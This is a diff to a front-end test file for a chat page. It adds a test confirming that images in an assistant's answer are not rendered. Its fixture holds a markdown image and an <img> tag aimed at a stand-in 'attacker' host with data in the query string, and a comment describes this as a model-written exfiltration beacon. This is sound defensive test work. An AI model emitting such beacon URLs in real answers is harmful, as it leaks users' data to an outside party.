@@ -480,6 +480,19 @@ it('sanitises the answer: a script tag in the model text never becomes a script 
   expect(document.querySelector('script')).toBeNull();
 });
 
+it('renders no image from an answer: an <img> in the model text would be a GET nobody clicked', async () => {
+  // No CSP in this repo, so a remote image URL the model wrote would be fetched on render — an
+  // exfiltration beacon whose query string the model chooses.
+  chatMock.mockResolvedValue({
+    conversation: { id: 'c1', title: null, model: null, review_mode: false, last_message_at: null },
+    messages: [msg({ id: 'm2', role: 'assistant', text: 'olha isso ![](https://attacker/?d=segredo)\n\n<img src="https://attacker/?d=raw">' })],
+  });
+  render(<ChatPage />);
+
+  await screen.findByText(/olha isso/);
+  expect(document.querySelectorAll('img')).toHaveLength(0);
+});
+
 it('puts a card between the two messages it was proposed between', async () => {
   chatMock.mockResolvedValue({
     conversation: { id: 'c1', title: null, model: null, review_mode: false, last_message_at: null },
